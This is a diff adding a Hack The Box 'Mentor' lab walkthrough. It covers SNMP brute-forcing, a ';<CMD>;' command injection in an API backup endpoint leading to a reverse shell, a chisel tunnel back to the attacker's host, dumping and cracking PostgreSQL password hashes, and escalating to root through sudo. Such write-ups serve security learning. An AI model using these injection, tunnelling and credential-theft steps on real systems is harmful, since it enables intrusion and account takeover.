@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/mentor.png
-tags: ["HTB"]
+tags: ["HTB", "snmp", "fastapi", "flask", "snmp-brute", "onesixtyone", "snmpwalk", "snmpbulkwalk", "command-injection", "postgresql", "chisel", "psql", "crackstation"]
 ---
 
 # Mentor
@@ -234,6 +234,7 @@ Trying ['', '0', '0392a0', '1234', '2read', '3com', '3Com', '3COM', '4changes', 
 10.10.11.193 : 161      Version (v2c):  internal
 10.10.11.193 : 161      Version (v1):   public
 10.10.11.193 : 161      Version (v2c):  public
+
 10.10.11.193 : 161      Version (v1):   public
 10.10.11.193 : 161      Version (v2c):  public
 
@@ -246,3 +247,243 @@ Trying ['', '0', '0392a0', '1234', '2read', '3com', '3Com', '3COM', '4changes', 
 
 ![](./images/4.png)
 
+- There was a `james`' email which I tried using with password I found in `SNMP` and it returned a `token`
+
+![](./images/5.png)
+
+- Token contains only `username` and `email`
+
+![](./images/6.png)
+
+- But with this token we can request other endpoints
+
+![](./images/7.png)
+
+- We saw `admin` endpoint during enumeration
+  - I tried checking if I have admin privileges
+  - But it looks like it's not implemented yet
+
+![](./images/8.png)
+
+- It also has `/admin/backup` 
+  - It works with `POST` request 
+  - But still returns error
+
+![](./images/9.png)
+
+- It needs `Content-Type: application/json`
+  - And body `{}` with `path` field
+
+![](./images/10.png)
+
+- We can try injecting commands (`ping` for example)
+  - The payload that worked: `;<CMD>;`
+
+![](./images/11.png)
+
+- Bash reverse shells didn't work
+  - The python one worked, since we saw that it was isntalled in `snmp` results
+  - I received the connection but it was breaking right away
+    - Changing to `sh` instead of `bash` worked
+
+![](./images/12.png)
+
+## User
+- We know it's a `docker` application
+```
+/ # ls -lha
+total 172K   
+drwxr-xr-x    1 root     root        4.0K Nov 14 17:56 .
+drwxr-xr-x    1 root     root        4.0K Nov 14 17:56 ..
+-rwxr-xr-x    1 root     root           0 Nov 14 17:56 .dockerenv
+drwxr-xr-x    3 root     root        4.0K Dec 11  2022 API
+drwxr-xr-x    1 root     root        4.0K Nov 10  2022 app
+-rw-r--r--    1 root     root       99.5K Nov 15 15:00 app_backkup.tar
+drwxr-xr-x    1 root     root        4.0K Jun  8  2022 bin
+drwxr-xr-x    5 root     root         340 Nov 14 17:56 dev
+drwxr-xr-x    1 root     root        4.0K Nov 14 17:56 etc
+drwxr-xr-x    1 root     root        4.0K Nov 10  2022 home
+drwxr-xr-x    1 root     root        4.0K Jun  8  2022 lib
+drwxr-xr-x    5 root     root        4.0K Nov 10  2022 media
+drwxr-xr-x    2 root     root        4.0K Nov 10  2022 mnt
+drwxr-xr-x    2 root     root        4.0K Nov 10  2022 opt
+dr-xr-xr-x  301 root     root           0 Nov 14 17:56 proc
+drwx------    2 root     root        4.0K Nov 10  2022 root
+drwxr-xr-x    2 root     root        4.0K Nov 10  2022 run
+drwxr-xr-x    2 root     root        4.0K Nov 10  2022 sbin
+drwxr-xr-x    2 root     root        4.0K Nov 10  2022 srv
+dr-xr-xr-x   13 root     root           0 Nov 14 17:56 sys
+drwxrwxrwt    1 root     root        4.0K Nov 14 17:56 tmp
+drwxr-xr-x    1 root     root        4.0K Nov 10  2022 usr
+drwxr-xr-x    1 root     root        4.0K Nov 10  2022 var
+
+```
+
+- `app` and `API` folder contain `Dockerfiles`
+```
+/ # cat app/Dockerfile 
+FROM python:3.6.9-alpine
+
+RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev
+
+WORKDIR /app
+ENV HOME /home/svc
+ENV PATH /home/svc/.local/bin:${PATH}
+RUN python -m pip install --upgrade pip --user svc
+COPY requirements.txt requirements.txt
+RUN pip install -r requirements.txt
+RUN pip install pydantic[email] pyjwt
+EXPOSE 8000
+COPY . .
+CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "100", "--host", "0.0.0.0", "--port" ,"8000"]
+/ # cat API/Dockerfile 
+FROM python:3.6.9-alpine
+
+RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev
+
+WORKDIR /app
+ENV HOME /home/svc
+ENV PATH /home/svc/.local/bin:${PATH}
+RUN python -m pip install --upgrade pip --user svc
+COPY requirements.txt requirements.txt
+RUN pip install -r requirements.txt
+RUN pip install pydantic[email] pyjwt
+EXPOSE 8000
+COPY . .
+CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "1", "--host", "0.0.0.0", "--port" ,"8000"]
+/ # 
+
+```
+
+- Both have `--reload` flag, thus the applications check for changes in source files
+  - Inside we see `db.py` which connect to `db` which is probably located in the host since it's ip is different
+```
+/app/app # cat db.py 
+import os
+
+from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
+from sqlalchemy.sql import func
+from databases import Database
+
+# Database url if none is passed the default one is used
+DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
+
+# SQLAlchemy for quotes
+engine = create_engine(DATABASE_URL)
+metadata = MetaData()
+quotes = Table(
+    "quotes",
+    metadata,
+    Column("id", Integer, primary_key=True),
+    Column("title", String(50)),
+    Column("description", String(50)),
+    Column("created_date", DateTime, default=func.now(), nullable=False)
+)
+<SNIP>
+```
+
+- We can upload `chisel` and configure port forwarding
+  - Or we can change the source code `/app/app/api/models.py` to include `password` which will be updated live due to `--reload` flag 
+```
+└─$ ./chisel server -p 9001 --reverse
+```
+```
+/tmp # ./chisel client 10.10.16.4:9001 R:5432:172.22.0.1:5432
+```
+
+- Now we can connect to `postgres` and enumerate it
+```
+└─$ psql -h 127.0.0.1 -U postgres                               
+Password for user postgres: 
+psql (16.0 (Debian 16.0-2), server 13.7 (Debian 13.7-1.pgdg110+1))
+Type "help" for help.
+
+postgres=# \list
+                                                         List of databases
+      Name       |  Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | ICU Locale | ICU Rules |   Access privileges   
+-----------------+----------+----------+-----------------+------------+------------+------------+-----------+-----------------------
+ mentorquotes_db | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
+ postgres        | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
+ template0       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/postgres          +
+                 |          |          |                 |            |            |            |           | postgres=CTc/postgres
+ template1       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/postgres          +
+                 |          |          |                 |            |            |            |           | postgres=CTc/postgres
+(4 rows)
+
+postgres=# \c mentorquotes_db
+psql (16.0 (Debian 16.0-2), server 13.7 (Debian 13.7-1.pgdg110+1))
+You are now connected to database "mentorquotes_db" as user "postgres".
+mentorquotes_db=# \dt
+          List of relations
+ Schema |   Name   | Type  |  Owner   
+--------+----------+-------+----------
+ public | cmd_exec | table | postgres
+ public | quotes   | table | postgres
+ public | users    | table | postgres
+(3 rows)
+
+mentorquotes_db=# select * from users;
+ id |         email          |  username   |             password             
+----+------------------------+-------------+----------------------------------
+  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
+  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
+(2 rows)
+```
+
+- `svc`'s hash can be cracked in https://crackstation.net/
+  - `53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani`
+  - We can now `ssh` as `svc`
+```
+└─$ sshpass -p '123meunomeeivani' ssh svc@10.10.11.193 
+Warning: Permanently added '10.10.11.193' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+<SNIP>
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
+svc@mentor:~$ 
+
+```
+
+## Root
+- `linpeas` shows a password in `/etc/snmp/snmpd.conf`
+```
+<SNIP>
+╔══════════╣ Analyzing SNMP Files (limit 70)
+-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf                                                                                                                                                                               
+# rocommunity: a SNMPv1/SNMPv2c read-only access community name
+rocommunity  public default -V systemonly
+rocommunity6 public default -V systemonly
+createUser bootstrap MD5 SuperSecurePassword123__ DES
+-rw------- 1 Debian-snmp Debian-snmp 1268 Nov 14 17:55 /var/lib/snmp/snmpd.conf
+<SNIP>
+```
+  
+- We can `su` to `james`
+```
+svc@mentor:/tmp$ su - james
+Password: 
+james@mentor:~$
+```
+
+- And he has `sudo` rights
+```
+james@mentor:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on mentor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User james may run the following commands on mentor:
+    (ALL) /bin/sh
+james@mentor:~$ sudo sh
+# whoami
+root
+
+```
